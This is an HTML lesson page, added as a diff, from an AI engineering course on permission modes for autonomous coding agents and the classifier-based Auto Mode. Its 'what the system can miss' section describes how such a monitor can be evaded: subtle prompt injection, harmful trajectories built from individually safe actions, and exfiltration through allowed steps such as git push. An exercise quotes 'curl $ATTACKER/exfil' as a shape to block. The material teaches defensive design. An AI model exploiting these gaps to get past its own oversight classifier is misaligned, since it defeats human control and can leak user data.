@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Permission Modes for Autonomous Agents — AI Engineering</title>
+<link rel="stylesheet" href="/lesson.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
+<style>:root{--accent:#2a4c72;--accent-2:#1a3556;}</style>
+</head>
+<body>
+<a class="skip" href="#content">Skip to content</a>
+<header class="topbar">
+  <a class="home" href="/">Field manuals</a>
+  <span class="topbar-sep">›</span>
+  <a class="home" href="/ai-engineering"><b>AI Engineering</b></a>
+  <nav>
+    <a href="/ai-engineering">Index</a>
+    <a href="https://github.com/rohitg00/ai-engineering-from-scratch/blob/main/phases/15-autonomous-systems/10-claude-code-permission-modes/docs/en.md" target="_blank" rel="noreferrer">Source</a>
+  </nav>
+</header>
+<div class="page">
+  <aside class="sidenav">
+    <div class="crumbs">
+      <a href="/">Home</a>
+      <span>›</span>
+      <a href="/ai-engineering">AI Engineering</a>
+    </div>
+    <div class="phase-label">Autonomous Systems</div>
+    <ol class="toc"><li><a href="#the-problem">The Problem</a></li><li><a href="#the-concept">The Concept</a></li><li><a href="#use-it">Use It</a></li><li><a href="#ship-it">Ship It</a></li><li><a href="#exercises">Exercises</a></li><li><a href="#key-terms">Key Terms</a></li><li><a href="#further-reading">Further Reading</a></li></ol>
+  </aside>
+
+  <article id="content" class="prose">
+    <div class="eyebrow">AI Engineering · Autonomous Systems</div>
+    <h1 class="lesson-title">Permission Modes for Autonomous Agents</h1>
+    <p class="lesson-sub">A permission ladder — graduated levels of autonomy from review-every-action to approve-everything — is how a harness governs what an autonomous agent may do without asking. Claude Code, this lesson&#39;s worked example, exposes six such modes: &quot;plan&quot; asks before every action, &quot;default&quot; (labeled &quot;Manual&quot; in the UI) asks only for risky ones, &quot;acceptEdits&quot; auto-approves file writes but still confirms shell execution, and &quot;bypassPermissions&quot; approves everything. Auto Mode — the `auto` permission mode — replaces per-action approval with a separate classifier model that reviews each action before it runs and blocks anything that escalates beyond what the request asked for. Action budgets are enforced via `max_turns` and `max_budget_usd`. Availability of `auto` depends on plan, org enablement, model, and provider — and Anthropic is explicit that the classifier is not sufficient alone.</p>
+    <div class="meta-strip"><div><span>Type</span><b>Learn</b></div><div><span>Languages</span><b>Python (stdlib, two-stage classifier simulator)</b></div><div><span>Prerequisites</span><b>Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)</b></div><div><span>Time</span><b>~45 minutes</b></div></div>
+    
+    <figure class="sigil">
+      <svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet" role="img" aria-label="AI Engineering — Autonomous Systems 10">
+        <rect width="320" height="180" fill="#ebe4d5"/>
+        <circle cx="19.4" cy="124.3" r="12.1" fill="none" stroke="#2a4c72" stroke-width="1.1" opacity="0.55"/>
+        <circle cx="124.0" cy="119.4" r="11.5" fill="none" stroke="#37613b" stroke-width="1.1" opacity="0.55"/>
+        <circle cx="118.5" cy="114.5" r="10.8" fill="none" stroke="#2a4c72" stroke-width="1.1" opacity="0.55"/>
+        <circle cx="113.1" cy="109.6" r="10.2" fill="none" stroke="#37613b" stroke-width="1.1" opacity="0.55"/>
+        <circle cx="107.7" cy="104.6" r="9.5" fill="none" stroke="#2a4c72" stroke-width="1.1" opacity="0.55"/>
+        <circle cx="102.3" cy="99.7" r="8.9" fill="none" stroke="#37613b" stroke-width="1.1" opacity="0.55"/>
+        <text x="160" y="20" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="10" letter-spacing="1.4" fill="#2a4c72" textLength="112" lengthAdjust="spacingAndGlyphs">AI ENGINEERING</text>
+        <circle cx="70" cy="100" r="44" fill="none" stroke="#2a4c72" stroke-width="1" stroke-dasharray="2 4"/>
+        <text x="70" y="114" text-anchor="middle" font-family="Fraunces, Georgia, serif" font-weight="900" font-size="48" fill="#2a4c72" letter-spacing="-2">10</text>
+        <text x="70" y="160" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="9" letter-spacing="1.2" fill="#55503f" textLength="120" lengthAdjust="spacingAndGlyphs">AUTONOMOUS SYSTEMS</text>
+        <line x1="148" y1="44" x2="148" y2="156" stroke="#d6ceba"/>
+        <text y="78" text-anchor="middle" font-family="Fraunces, Georgia, serif" font-style="italic" font-size="16" fill="#1c1a17"><tspan x="230" dy="0" textLength="150" lengthAdjust="spacingAndGlyphs">Permission Modes for</tspan><tspan x="230" dy="22" textLength="150" lengthAdjust="spacingAndGlyphs">Autonomous Agents</tspan></text>
+        <text x="230" y="158" text-anchor="middle" font-family="JetBrains Mono, monospace" font-size="9" letter-spacing="0.6" fill="#55503f">field manual</text>
+      </svg>
+    </figure>
+  
+    <h2 id="the-problem"><a class="anchor" href="#the-problem">#</a> The Problem</h2>
+<p>An autonomous coding agent on your machine is a distinct security category. The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a &quot;feature update&quot; of chatbots, they are a new kind of tool with a new kind of risk profile.</p>
+<p>Claude Code&#39;s permission system is Anthropic&#39;s answer. Rather than one &quot;autonomous / not autonomous&quot; switch, there are six modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a separate classifier model that moves approval off the user&#39;s critical path: it reviews each action before it runs and blocks anything that escalates beyond the request.</p>
+<p>The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?</p>
+<h2 id="the-concept"><a class="anchor" href="#the-concept">#</a> The Concept</h2>
+<h3 id="the-six-permission-modes"><a class="anchor" href="#the-six-permission-modes">#</a> The six permission modes</h3>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Behavior</th>
+<th>When to use</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>plan</code></td>
+<td>Agent proposes a plan; user approves the whole plan; every action is reviewed before execution</td>
+<td>Unfamiliar task; prod-adjacent code; first time using the agent on a repo</td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td>Labeled &quot;Manual&quot; in the UI. Agent runs actions; prompts user for any &quot;risky&quot; action (shell exec, destructive operations, network calls)</td>
+<td>Most interactive coding sessions</td>
+</tr>
+<tr>
+<td><code>acceptEdits</code></td>
+<td>File writes auto-approve; shell exec and network calls still prompt</td>
+<td>Refactoring pass across many files</td>
+</tr>
+<tr>
+<td><code>auto</code></td>
+<td>A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request</td>
+<td>Long-horizon unattended runs in a constrained workspace</td>
+</tr>
+<tr>
+<td><code>dontAsk</code></td>
+<td>Never prompts; actions not pre-approved by permission rules are denied</td>
+<td>Ephemeral sandboxes, CI jobs, research scripts</td>
+</tr>
+<tr>
+<td><code>bypassPermissions</code></td>
+<td>Approves everything</td>
+<td>Documented as &quot;only inside ephemeral containers you are willing to throw away&quot;</td>
+</tr>
+</tbody></table>
+<p>(Names above match public Claude Code docs; the UI labels <code>default</code> as &quot;Manual&quot;.)</p>
+<h3 id="auto-mode-in-one-page"><a class="anchor" href="#auto-mode-in-one-page">#</a> Auto Mode in one page</h3>
+<p>Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model. Structure:</p>
+<ol>
+<li><strong>A separate classifier model.</strong> Reviews every proposed action before it runs, judged against the declared task and the current state of the session, and blocks anything that escalates beyond what the request called for. Blocked actions fall back to the user.</li>
+<li><strong>Gated availability.</strong> Whether <code>auto</code> is offered at all depends on plan, organization enablement, model, and provider.</li>
+</ol>
+<p>Budget controls sit alongside the classifier:</p>
+<ul>
+<li><code>max_turns</code> — total iterations in a session.</li>
+<li><code>max_budget_usd</code> — dollar cap that aborts the session.</li>
+<li>action-count limits per tool (no more than N <code>WebFetch</code> calls, etc.).</li>
+</ul>
+<h3 id="what-the-system-catches"><a class="anchor" href="#what-the-system-catches">#</a> What the system catches</h3>
+<ul>
+<li>Straightforward prompt injection into tool inputs where the injected instruction maps to a known-risky action shape.</li>
+<li>Repetitive tool loops — the classifier can see action N+1 is nearly identical to action N, five times in a row.</li>
+<li>Clearly out-of-scope shell commands on an otherwise file-edit-only session.</li>
+</ul>
+<h3 id="what-the-system-can-miss"><a class="anchor" href="#what-the-system-can-miss">#</a> What the system can miss</h3>
+<ul>
+<li><strong>Subtle prompt injection</strong> that modulates behavior without producing a single flagged action. Indirect prompt injection is not a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).</li>
+<li><strong>Semantic-level misbehavior.</strong> Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user&#39;s intent.</li>
+<li><strong>Exfiltration through legitimate channels.</strong> Writing data to a file you own, then <code>git push</code>ing to a public repo, is a sequence of allowed actions whose composition is the problem.</li>
+</ul>
+<h3 id="research-preview-framing"><a class="anchor" href="#research-preview-framing">#</a> Research preview framing</h3>
+<p>Anthropic shipped Auto Mode as a research preview. The documentation is explicit that the classifier is a layer, not a solution: users are expected to combine Auto Mode with budgets, allowlists, isolated workspaces, and trajectory audits (Lessons 12–16). The preview framing also reflects the documented evaluation-vs-deployment gap (Lesson 1) — a classifier that passes offline evals can behave differently in a real session where the user&#39;s context is ambiguous.</p>
+<h3 id="where-this-ladder-lives-in-your-workflow"><a class="anchor" href="#where-this-ladder-lives-in-your-workflow">#</a> Where this ladder lives in your workflow</h3>
+<ul>
+<li>Unfamiliar task: start in <code>plan</code>. Reading the plan is cheaper than rolling back a bad run.</li>
+<li>Known refactor: <code>acceptEdits</code> saves a lot of confirmation clicks.</li>
+<li>Unattended background run: <code>auto</code> only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).</li>
+<li>Ephemeral containers: <code>dontAsk</code> / <code>bypassPermissions</code> is acceptable if and only if the container and its credentials are disposable.</li>
+</ul>
+
+      <div class="codeblock" data-lang="figure">
+        <span class="cb-label">figure</span>
+        <button class="cb-copy" type="button" aria-label="Copy code">copy</button>
+        <pre><code class="language-figure hljs">autonomy-oversight</code></pre>
+      </div>
+    <h2 id="use-it"><a class="anchor" href="#use-it">#</a> Use It</h2>
+<p><code>code/main.py</code> simulates an action-review classifier as a two-stage pipeline — a teaching simplification; the real <code>auto</code> mode is backed by a separate classifier model, not a documented two-stage contract. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.</p>
+<h2 id="ship-it"><a class="anchor" href="#ship-it">#</a> Ship It</h2>
+<p><code>outputs/skill-permission-mode-picker.md</code> matches a task description to the right permission mode, budget caps, and required isolation.</p>
+<h2 id="exercises"><a class="anchor" href="#exercises">#</a> Exercises</h2>
+<ol>
+<li><p>Run <code>code/main.py</code>. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?</p>
+</li>
+<li><p>Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., <code>curl $ATTACKER/exfil</code>). Measure the false-positive rate on the benign-action sample.</p>
+</li>
+<li><p>Read Anthropic&#39;s &quot;How the agent loop works&quot; doc. List every external state the agent touches by default in <code>default</code> mode. Which would you need to gate separately before running <code>auto</code> unattended?</p>
+</li>
+<li><p>Design a 24-hour unattended run budget: <code>max_turns</code>, <code>max_budget_usd</code>, per-tool caps, allowlists. Justify each number.</p>
+</li>
+<li><p>Describe one trajectory where every individual action is approved by the classifier, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)</p>
+</li>
+</ol>
+<h2 id="key-terms"><a class="anchor" href="#key-terms">#</a> Key Terms</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>What people say</th>
+<th>What it actually means</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Permission mode</td>
+<td>&quot;How much the agent can do&quot;</td>
+<td>One of six named policies controlling per-action approval</td>
+</tr>
+<tr>
+<td>plan mode</td>
+<td>&quot;Ask before anything&quot;</td>
+<td>Agent writes a plan; user approves before execution</td>
+</tr>
+<tr>
+<td>acceptEdits</td>
+<td>&quot;Let it write files&quot;</td>
+<td>File writes auto-approve; shell exec still prompts</td>
+</tr>
+<tr>
+<td>auto</td>
+<td>&quot;Auto approvals&quot;</td>
+<td>Separate classifier model reviews each action; blocks escalation beyond the request</td>
+</tr>
+<tr>
+<td>bypassPermissions</td>
+<td>&quot;Full YOLO&quot;</td>
+<td>Approves everything; intended for ephemeral containers</td>
+</tr>
+<tr>
+<td>Stage 1 (simulator)</td>
+<td>&quot;Fast keyword check&quot;</td>
+<td>Cheap rule over proposed actions in <code>code/main.py</code></td>
+</tr>
+<tr>
+<td>Stage 2 (simulator)</td>
+<td>&quot;Deep review&quot;</td>
+<td>Slower multi-rule reviewer for flagged actions in <code>code/main.py</code></td>
+</tr>
+<tr>
+<td>Research preview</td>
+<td>&quot;Not GA&quot;</td>
+<td>Anthropic framing for features whose failure mode is still being mapped</td>
+</tr>
+</tbody></table>
+<h2 id="further-reading"><a class="anchor" href="#further-reading">#</a> Further Reading</h2>
+<ul>
+<li><a href="https://code.claude.com/docs/en/agent-sdk/agent-loop">Anthropic — How the agent loop works</a> — permission modes, budgets, action format.</li>
+<li><a href="https://platform.claude.com/docs/en/managed-agents/overview">Anthropic — Claude Managed Agents overview</a> — managed-service execution model.</li>
+<li><a href="https://www.anthropic.com/product/claude-code">Anthropic — Claude Code product page</a> — feature surface and Auto Mode announcement.</li>
+<li><a href="https://www.anthropic.com/news/claudes-constitution">Anthropic — Claude&#39;s Constitution (January 2026)</a> — the reason-based layer that shapes classifier judgments.</li>
+<li><a href="https://www.anthropic.com/research/measuring-agent-autonomy">Anthropic — Measuring agent autonomy in practice</a> — internal perspective on long-horizon permission design.</li>
+</ul>
+
+
+    <nav class="paginate">
+      <a class="prev" href="./09-coding-agent-landscape.html"><span>← Previous</span><b>coding agent landscape</b></a>
+      <a class="next" href="./11-browser-agents.html"><span>Next →</span><b>browser agents</b></a>
+    </nav>
+  </article>
+</div>
+
+<script type="module">
+  import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+  mermaid.initialize({
+    startOnLoad: true, theme: "base", fontFamily: "JetBrains Mono, monospace",
+    themeVariables: {
+      background: "#ebe4d5", primaryColor: "#f2ede4", primaryTextColor: "#1c1a17",
+      primaryBorderColor: "#2a4c72", secondaryColor: "#faf1de",
+      secondaryBorderColor: "#a97817", tertiaryColor: "#eaf1e9", tertiaryBorderColor: "#37613b",
+      lineColor: "#55503f", textColor: "#1c1a17", mainBkg: "#f2ede4",
+      nodeBorder: "#2a4c72", clusterBkg: "#ebe4d5", clusterBorder: "#c4baa1",
+      titleColor: "#1c1a17", edgeLabelBackground: "#ebe4d5", fontSize: "13px",
+    },
+    flowchart: { curve: "basis", htmlLabels: true, padding: 12 },
+  });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/typescript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+
+<script>
+  hljs.highlightAll();
+  document.querySelectorAll(".cb-copy").forEach((btn) => {
+    btn.addEventListener("click", async () => {
+      const code = btn.parentElement.querySelector("code")?.innerText || "";
+      try { await navigator.clipboard.writeText(code); btn.textContent = "copied"; }
+      catch { btn.textContent = "err"; }
+      setTimeout(() => (btn.textContent = "copy"), 1600);
+    });
+  });
+</script>
+</body>
+</html>
